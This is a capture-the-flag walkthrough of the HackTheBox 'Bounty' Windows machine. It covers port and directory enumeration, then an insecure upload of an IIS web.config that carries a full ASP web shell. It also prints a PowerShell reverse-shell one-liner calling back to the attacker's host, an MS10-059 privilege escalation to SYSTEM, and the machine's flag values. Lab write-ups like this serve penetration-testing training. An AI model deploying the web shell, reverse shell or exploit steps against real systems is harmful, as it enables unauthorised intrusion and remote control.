---
Category:
  - B2R
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [MS10-059, RCE, insecure-file-upload, web.config, Windows]
---
# Resolution summary

>[!summary]
>- Target is vulnerable to Arbitrary Code Execution caused by the possibility to upload `web.config` files on the server (IIS 7.5)
>- Local enumeration showed that the system was unpatched and vulnerable to MS10-059

## Improved skills

- Exploit Insecure File Upload to overwrite config files
- Exploit known local vulnerability

## Used tools

- nmap
- gobuster
- windows-exploit-suggester
- public exploits

---

# Information Gathering

Scanned all TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Bounty]
└─$ sudo nmap -p- -sS 10.10.10.93 -oN scans/all-tcp-ports.txt -Pn -v
...
PORT   STATE SERVICE
80/tcp open  http
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Bounty]
└─$ sudo nmap -p80 -sT -sV -sC -A 10.10.10.93 -oN scans/open-tcp-ports.txt -Pn
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
```

# Enumeration

## Port 80 - HTTP (Microsoft IIS httpd 7.5)

Browsed port 80:

![Pasted image 20210524153647.png](../../zzz_res/attachments/Pasted_image_20210524153647.png)

Enumerated web application components using Wappalyzer:

![Pasted image 20210524153717.png](../../zzz_res/attachments/Pasted_image_20210524153717.png)

Enumerated web directories and files:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Bounty]
└─$ gobuster dir -u http://10.10.10.93 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/p80-directories.txt -r -f -t 20
...
/aspnet_client/       (Status: 403) [Size: 1233]
/uploadedfiles/       (Status: 403) [Size: 1233]

┌──(kali㉿kali)-[~/CTFs/HTB/box/Bounty]
└─$ gobuster dir -u http://10.10.10.93 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -o scans/p80-files.txt -t 20
...
/.                    (Status: 200) [Size: 630]
/iisstart.htm         (Status: 200) [Size: 630]

┌──(kali㉿kali)-[~/CTFs/HTB/box/Bounty]
└─$ gobuster dir -u http://10.10.10.93/aspnet_client -w /usr/share/seclists/Discovery/Web-Content/common.txt -x asp,htm,aspx -t20
...
/system_web           (Status: 301) [Size: 167] [--> http://10.10.10.93/aspnet_client/system_web/]

┌──(kali㉿kali)-[~/CTFs/HTB/box/Bounty]
└─$ gobuster dir -u http://10.10.10.93 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x asp,htm,aspx -t20
...
/transfer.aspx        (Status: 200) [Size: 941]
```

Enumerated transfer.aspx:

![Pasted image 20210524155932.png](../../zzz_res/attachments/Pasted_image_20210524155932.png)

Text files were rejected:

![Pasted image 20210524160040.png](../../zzz_res/attachments/Pasted_image_20210524160040.png)

![Pasted image 20210524160142.png](../../zzz_res/attachments/Pasted_image_20210524160142.png)

Images were accepted:

![Pasted image 20210524160710.png](../../zzz_res/attachments/Pasted_image_20210524160710.png)

![Pasted image 20210524160741.png](../../zzz_res/attachments/Pasted_image_20210524160741.png)

**.config** file were accepted:

![Pasted image 20210524164326.png](../../zzz_res/attachments/Pasted_image_20210524164326.png)

# Exploitation

## Insecure File Upload (.config Remote File Execution)

- [upload-a-web-config-file-for-fun-profit](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)
- [uploading-web-config-for-fun-and-profit-2](https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/)
- [KSEC ARK - Pentesting and redteam knowledge base | IIS - Web.config File Exploit](https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/)

It was possible to execute arbitrary code uploading a custom `web.config` file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<% Response.write("-"&"->")%>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>

<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>

<%Response.write("<!-"&"-") %>
```

Uploaded the file:

![Pasted image 20210524172515.png](../../zzz_res/attachments/Pasted_image_20210524172515.png)

Browsed the web shell:

![Pasted image 20210524172539.png](../../zzz_res/attachments/Pasted_image_20210524172539.png)

Obtained the reverse shell:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.3',10099);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()"
```

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Bounty/exploit]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.93] 49157

PS C:\windows\system32\inetsrv> whoami
bounty\merlin
PS C:\windows\system32\inetsrv> hostname
bounty
```

# Privilege Escalation

## Local enumeration

Systeminfo:

```powershell
PS C:\Users> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          5/24/2021, 4:38:55 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,586 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,593 MB
Virtual Memory: In Use:    502 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93
```

Users:

```powershell
C:\temp>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

- SeAssignPrimaryTokenPrivilege
- SeImpersonatePrivilege

windows-exploit-suggester:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Bounty/loot]
└─$ /opt/post-expl/windows/Windows-Exploit-Suggester/windows-exploit-suggester.py -i systeminfo -d /opt/post-expl/windows/Windows-Exploit-Suggester/2021-04-22-mssb.xls
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*]
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*]
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

## MS10-059

Downloaded and hosted the exploit:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Bounty/exploit]
└─$ wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS10-059/MS10-059.exe
--2021-05-24 12:13:01--  https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS10-059/MS10-059.exe
...
2021-05-24 12:13:02 (5.53 MB/s) - ‘MS10-059.exe’ saved [784384/784384]

┌──(kali㉿kali)-[~/…/HTB/box/Bounty/exploit]
└─$ sudo impacket-smbserver kali . -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
...
```

Downloaded and executed the exploit on the target:

```powershell
C:\temp>copy \\10.10.14.3\kali\MS10-059.exe .
copy \\10.10.14.3\kali\MS10-059.exe .
        1 file(s) copied.

C:\temp>.\MS10-059.exe 10.10.14.3 10099
.\MS10-059.exe 10.10.14.3 10099

/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
```

Obtained SYSTEM shell:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Bounty]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.93] 49169
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\temp>whoami
whoami
nt authority\system

C:\temp>hostname
hostname
bounty

C:\temp>ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : bounty
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-CB-40
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.93(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{27C3F487-28AC-4CE6-AE3A-1F23518EF7A7}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   
C:\temp>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
c837f7b699feef5475a0c079f9d4f5ea
```

![Pasted image 20210524182042.png](../../zzz_res/attachments/Pasted_image_20210524182042.png)

# Trophy

>[!quote]
> Nobody has a monopoly on good ideas.
> 
>\- Kevin O'Leary

>[!success]
>**User.txt**
>e29ad89891462e0b09741e3082f44a2f

>[!success]
>**Root.txt**
>c837f7b699feef5475a0c079f9d4f5ea

